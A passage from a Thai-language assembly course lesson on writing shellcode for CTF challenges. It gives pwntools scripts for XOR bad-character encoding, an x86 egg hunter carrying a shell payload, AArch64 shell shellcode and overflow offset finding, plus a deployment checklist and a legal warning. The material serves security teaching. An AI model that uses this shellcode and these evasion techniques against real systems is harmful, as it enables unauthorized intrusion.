    print("[!] Original shellcode has bad chars, encoding...")
    
    # หา XOR key
    for key in range(1, 256):
        if bytes([key]) in BAD_CHARS:
            continue
        encoded = bytes([b ^ key for b in shellcode])
        if not check_bad_chars(encoded, BAD_CHARS):
            print(f"[+] Found key: 0x{key:02x}")
            
            # สร้าง decoder stub
            # ... (ดูส่วน XOR Encoder ด้านบน)
            break
    else:
        print("[!] No single-byte key works, need multi-byte encoding")
```

### Challenge 3: Egg Hunter Challenge

```python
#!/usr/bin/env python3
# solve_ctf3.py (egg hunter)

from pwn import *

context.arch = 'i386'

EGG = b'\x90\x50\x90\x50\x90\x50\x90\x50'

# Egg hunter shellcode (32 bytes)
egg_hunter = asm("""
    xor edx, edx
next_page:
    or dx, 0x0fff
next_addr:
    inc edx
    lea ebx, [edx]
    push 0x21
    pop eax
    int 0x80
    cmp al, 0xf2
    je next_page
    mov eax, 0x50905090
    cmp [edx], eax
    jne next_addr
    cmp [edx+4], eax
    jne next_addr
    jmp edx
""")

# Real shellcode
real_sc = EGG + asm(shellcraft.sh())

print(f"[*] Egg hunter: {len(egg_hunter)} bytes")
print(f"[*] Real shellcode: {len(real_sc)} bytes")

# Payload:
# small buffer → overflow → egg_hunter → ret
# real_sc placed somewhere accessible (e.g., in another input)
```

### Challenge 4: AArch64 Shellcode

```python
#!/usr/bin/env python3
# solve_ctf4.py (ARM64)

from pwn import *

context.arch = 'aarch64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())

print(f"[*] AArch64 shellcode: {len(shellcode)} bytes")
print(f"[*] Hex: {shellcode.hex()}")

# ตรวจสอบ null bytes (ในกรณี 4-byte fixed instructions มักมี 00)
for i, b in enumerate(shellcode):
    if b == 0:
        print(f"  Null byte at offset {i}")
```

### เทคนิค: หา Buffer Overflow Offset

```python
#!/usr/bin/env python3
# find_offset.py

from pwn import *

context.arch = 'i386'

# สร้าง cyclic pattern
pattern = cyclic(200)
print(f"Pattern (200 bytes):\n{pattern}")

# หลังจาก crash ดู EIP/RIP value ใน GDB
# แล้วหา offset:
eip_value = b'aaab'  # value ที่เห็นใน EIP
offset = cyclic_find(eip_value)
print(f"Offset to EIP: {offset} bytes")
```

### เครื่องมือที่ควรรู้จัก

```
1. pwntools        - Python exploit framework
   pip3 install pwntools

2. NASM            - Netwide Assembler
   sudo apt install nasm

3. GDB + pwndbg    - Debugger
   pip3 install pwndbg
   
4. ROPgadget       - ROP chain builder
   pip3 install ropgadget

5. objdump         - Disassembler
   (built-in)

6. strace          - System call tracer
   sudo apt install strace

7. radare2         - Reverse engineering
   sudo apt install radare2

8. checksec        - Check security features
   checksec --file=./binary
```

---

## สรุป: Shellcode Writing Checklist

```
ก่อน deploy shellcode ทุกครั้ง:

□ ไม่มี null bytes (\x00)
□ ไม่มี bad characters ที่ระบุไว้
□ Position independent (ไม่มี hardcoded addresses)
□ ทดสอบด้วย C harness แล้ว
□ ขนาดเหมาะสมกับ buffer ที่มี
□ ตรวจสอบ architecture (32/64-bit)
□ ตรวจสอบ OS (Linux/Windows/macOS)
□ ทดสอบกับ security mitigations ที่ target มี

ถ้ามี bad chars:
□ ลอง XOR encoding ก่อน
□ ถ้าไม่พอ ลอง multi-byte encoding
□ พิจารณา shellcraft หรือ msf encoder
□ เขียน custom encoder ถ้าจำเป็น

ถ้าพื้นที่จำกัด:
□ ใช้ short opcodes
□ ลบ NOP sleds ออก
□ พิจารณา egg hunter
□ พิจารณา staged payload
```

---

## แหล่งอ้างอิงและเรียนรู้เพิ่มเติม

```
CTF Resources:
  - pwnable.kr
  - exploit.education  
  - ropemporium.com
  - ctftime.org

Documentation:
  - Linux syscall table: syscalls.kernelgrok.com
  - AArch64 ISA: developer.arm.com/documentation
  - Intel x86 manual: intel.com/software-developer-manuals

Tools Documentation:
  - pwntools docs: docs.pwntools.com
  - nasm docs: nasm.us/doc
  - radare2 book: book.rada.re

Books:
  - "Hacking: The Art of Exploitation" - Jon Erickson
  - "The Shellcoder's Handbook"
  - "Attacking the Core" (free online)

Security Research (ethical):
  - CVE database: cve.mitre.org
  - Exploit-db: exploit-db.com (educational)
```

---

> **คำเตือนสุดท้าย**: ความรู้เรื่อง shellcode นี้มีไว้เพื่อ:
> 1. การแข่งขัน CTF (Capture The Flag)
> 2. การเรียนรู้ด้าน computer security
> 3. การทดสอบระบบของตัวเองหรือที่ได้รับอนุญาต
> 4. การวิจัยด้าน security แบบ ethical
>
> การนำไปใช้โจมตีระบบที่ไม่ได้รับอนุญาตถือเป็น**อาชญากรรม**
> ทั้งในประเทศไทยและประเทศอื่นๆ ทั่วโลก

---

*Part 074 จาก Assembly Language Course*
*เนื้อหา: Shellcode Writing สำหรับ Educational/CTF*
